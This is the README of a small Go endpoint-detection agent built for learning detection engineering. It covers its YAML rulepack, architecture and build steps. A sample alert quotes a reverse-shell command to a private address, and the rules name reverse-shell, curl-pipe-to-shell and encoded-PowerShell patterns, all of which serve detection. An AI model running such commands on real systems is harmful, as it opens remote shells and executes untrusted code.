# darkforge-edr

> A lightweight endpoint detection agent in Go. Watches processes, scores them against a YAML rulepack, and ships alerts to a local JSON log or any HTTP collector.

[![Go](https://img.shields.io/badge/Go-1.22+-00ADD8.svg)]() [![License: MIT](https://img.shields.io/badge/License-MIT-yellow.svg)](LICENSE)

---

## What it does

`darkforge-edr` is a small, hackable endpoint-detection agent designed as a learning playground for blue-team / detection-engineering concepts:

- **Process telemetry** — polls running processes, emits create/exit events.
- **Rule engine** — YAML rules match against process name, command line, and parent-child chains.
- **Alert sink** — writes JSON-lines to disk by default, optionally POSTs to an HTTP collector.
- **Tiny binary** — single Go executable, no runtime deps, runs as a non-root daemon for a baseline view.

The point isn't to compete with CrowdStrike. It's to walk the *anatomy* of an EDR — collector → ruleset → alert pipeline — in a few hundred lines you can read in one sitting. Useful for SOC / blue-team interviews because every layer is inspectable.

---

## Quick start

```bash
go install github.com/forgehk/darkforge-edr/cmd/dfedr@latest

# run with the default rulepack
dfedr run

# run with a custom rulepack and write alerts to alerts.jsonl
dfedr run --rules ./rules.yaml --out ./alerts.jsonl

# tail alerts in another terminal
tail -f alerts.jsonl | jq .
```

Sample alert (one per line, JSON):

```json
{
  "ts": "2026-05-17T07:42:11Z",
  "rule": "suspicious_shell_spawn",
  "severity": "high",
  "pid": 12031,
  "ppid": 1248,
  "name": "bash",
  "cmdline": "bash -i >& /dev/tcp/10.0.0.5/4444 0>&1",
  "host": "myhost",
  "tags": ["reverse-shell", "mitre:T1059"]
}
```

---

## Rule pack format

Rules live in YAML and match against fields on the observed process. Each rule:

```yaml
rules:
  - name: suspicious_shell_spawn
    severity: high
    when:
      name: ["bash", "sh", "zsh", "ksh"]
      cmdline_contains: ["/dev/tcp/", "nc -e", "ncat -e", "0>&1"]
    tags: ["reverse-shell", "mitre:T1059"]

  - name: powershell_encoded_command
    severity: high
    when:
      name: ["powershell.exe", "pwsh.exe"]
      cmdline_regex: '(?i)(-e(c|nc|ncodedcommand)\\s+[A-Za-z0-9+/=]{20,})'
    tags: ["t1059.001", "obfuscated-command"]

  - name: living_off_the_land_curl
    severity: medium
    when:
      name: ["curl", "wget"]
      cmdline_contains: ["|sh", "|bash", "|python"]
    tags: ["lolbin", "mitre:T1105"]

  - name: scheduled_task_recon
    severity: low
    when:
      name: ["crontab", "at", "schtasks.exe"]
      cmdline_contains: ["-l", "/query"]
    tags: ["mitre:T1053"]
```

Match semantics:

- `name`: exact match against the process basename (any in the list passes).
- `cmdline_contains`: any substring in the list passes.
- `cmdline_regex`: at least one regex must match (Go RE2 syntax).
- All clauses inside `when` are ANDed; if multiple list-style clauses, each requires at least one match.

---

## Architecture

```
┌──────────────────────────┐
│    process collector     │ → /proc on Linux, ps fallback on macOS,
│    (poll every 1s)       │   Win32 toolhelp on Windows.
└────────────┬─────────────┘
             │ events: process_create, process_exit
             ▼
┌──────────────────────────┐
│      rule engine         │ ← rules.yaml
│  name / cmdline / regex  │
└────────────┬─────────────┘
             │ matched events
             ▼
┌──────────────────────────┐
│       alert sink         │ → JSON-lines file, optional HTTP collector
└──────────────────────────┘
```

Each layer is a Go package with a small interface, so swapping the collector or sink is a one-file change.

---

## Build & test

```bash
git clone https://github.com/forgehk/darkforge-edr
cd darkforge-edr
go build ./cmd/dfedr
go test ./...
```

Cross-compile for another OS:

```bash
GOOS=linux  GOARCH=amd64 go build -o dist/dfedr-linux-amd64  ./cmd/dfedr
GOOS=darwin GOARCH=arm64 go build -o dist/dfedr-darwin-arm64 ./cmd/dfedr
```

---

## Why I built this

I wanted to understand what's *actually* inside an EDR rather than just reading vendor data sheets. This agent is the result — a clean, readable scaffold I can extend with new collectors (file events, network connects, syscalls via eBPF) over time.

It's also a good interview artifact for **SOC / Blue Team** roles because every part is small enough to walk through line by line.

---

## Roadmap

- [x] /proc-based process collector (Linux)
- [x] YAML rule engine with name/cmdline/regex matching
- [x] JSON-lines alert sink
- [x] Tag system for MITRE ATT&CK mapping
- [ ] File-create / file-modify collector (fanotify on Linux)
- [ ] Network-connect collector
- [ ] eBPF syscall hooks
- [ ] macOS / Windows process collectors
- [ ] Web dashboard (Next.js, lives in a separate repo)
- [ ] Signed releases via GitHub Actions

---

## License

[MIT](LICENSE)

---

*Built by [@forgehk](https://github.com/forgehk) — [DarkForge AI](https://darkforgeai.com)*
